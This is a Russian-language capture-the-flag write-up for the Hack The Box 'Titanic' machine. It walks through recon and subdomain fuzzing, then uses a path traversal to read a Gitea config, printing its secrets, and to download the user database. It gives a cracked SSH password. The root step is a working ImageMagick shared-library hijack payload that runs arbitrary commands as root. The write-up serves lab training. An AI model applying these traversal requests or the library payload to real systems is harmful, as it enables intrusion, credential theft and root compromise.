---
title: Titanic HTB
date: 2025-06-25
---

# Разведка

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -O 10.10.11.55 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 07:31 EDT
Nmap scan report for 10.10.11.55
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   184.40 ms 10.10.16.1
2   184.87 ms 10.10.11.55

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.17 seconds

```

Можем сразу заметить открытый 80 порт. Туда скорее всего и надо стучаться.

|_http-title: Did not follow redirect to http://titanic.htb/ . Идем в /etc/hosts


```console
┌──(kali㉿kali)-[~]
└─$ sudo vim /etc/hosts

```

и добавляем строку 10.10.11.55 titanic.htb

```/etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.55     titanic.htb <-- вот эту

::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


```

Переходим на сайт ну и конечно же открываем Burp или что вам там больше правится. Не тратя больших усилий,  находим Path Traversal:

![[titanic1.png]]

Круто. Но что дальше? Ищем субдомены и... находим

```console
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dnsmap.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -fs 308

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dnsmap.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 308
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 328ms]
:: Progress: [17576/17576] :: Job [1/1] :: 138 req/sec :: Duration: [0:02:20] :: Errors: 0 ::

```

опять идем в /etc/hosts и добавляем новый субдомен dev

```/etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.55     titanic.htb     dev.titanic.htb


::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

```

на нем находим Gitea:

![[titanic2.png]]

Гуляя по каталогам и папкам, находим вот такой файл (Удивительно, но он нам не понадобится, хотя и выглядит многообещающе)

```YAML
|   |
|---|
|`version: '3.8'`|
|||
||`services:`|
||`mysql:`|
||`image: mysql:8.0`|
||`container_name: mysql`|
||`ports:`|
||`- "127.0.0.1:3306:3306"`|
||`environment:`|
||`MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'`| <-- Вот это интересно
||`MYSQL_DATABASE: tickets`|
||`MYSQL_USER: sql_svc`|
||`MYSQL_PASSWORD: sql_password`|
||`restart: always`|
```

Вот это тоже интересно (А вот этот файл нам очень даже пригодится):

```YAML
|   |
|---|
|`version: '3'`|
|||
||`services:`|
||`gitea:`|
||`image: gitea/gitea`|
||`container_name: gitea`|
||`ports:`|
||`- "127.0.0.1:3000:3000"`|
||`- "127.0.0.1:2222:22" # Optional for SSH access`|
||`volumes:`|
||`- /home/developer/gitea/data:/data # Replace with your path`|
||`environment:`|
||`- USER_UID=1000`|
||`- USER_GID=1000`|
||`restart: always`|
```


# Эксплуатация, user flag

Мы узнали имена пользователей и теперь можно сделать прикол и получить user flag так:

![[titanic3.png]]

Но кроме флага это нам ничего не дает, а нам надо двигаться дальше, поэтому лучше подставьте такой payload в ticket:

**/home/developer/gitea/data/gitea/conf/app.ini**

И получаем ответ:

```output
HTTP/1.1 200 OK
Date: Mon, 30 Jun 2025 14:48:22 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/home/developer/gitea/data/gitea/conf/app.ini"
Content-Type: application/octet-stream
Content-Length: 2004
Last-Modified: Fri, 02 Aug 2024 10:42:14 GMT
Cache-Control: no-cache
ETag: "1722595334.8970726-2004-2176520380"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g

```



Скачиваем db 
```
curl -o gitea.db "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db"
```

В таблице все есть, чтобы получить пароли из хешей, но тут могут начаться небольшие сложности с преобразованием в формат hashcat, так что вот простое решение ...)  

Скачайте таблицу user в json:
![[titanic4.png]]

Дальше вы можете воспользоваться моим скриптом для преобразования в формат hashcat (там инструкция в readme, сами разберетесь)
вот [ссылка на репозиторий](https://github.com/o0wo0o/gitea_user_table_to_hashes.py.git)

Пароль от ssh такой же (25282528):

```console
ssh developer@10.10.11.55 
```

И в поле password: 25282528

# Пост эксплуатация, root flag

Что же дальше? Ну, в моем случае кто-то сломал машину -\_-
```console

developer@titanic:/tmp$ sudo -l
Matching Defaults entries for developer on titanic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User developer may run the following commands on titanic:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL

```

да уж...

Но есть и нормальный способ. Вам надо отправиться в 

/opt/scripts

найти там identify_images.sh и прочитать. Поняли, да? ну если пока не успели, то смотрите на файл /usr/bin/magick. делаем

```console
magick -version
```

Смотрим уязвимости по _ImageMagick 7.1.1-35_ и сразу же находим ссылку [https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
Она нам и нужна. Пробуем эксплойт

```console
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt /tmp");
    exit(0);
}
EOF
```

Ну или подставляем вместо _cp /root/root.txt /tmp_ то, что нравится вам --> забираем root.txt



![[всё.jpeg]]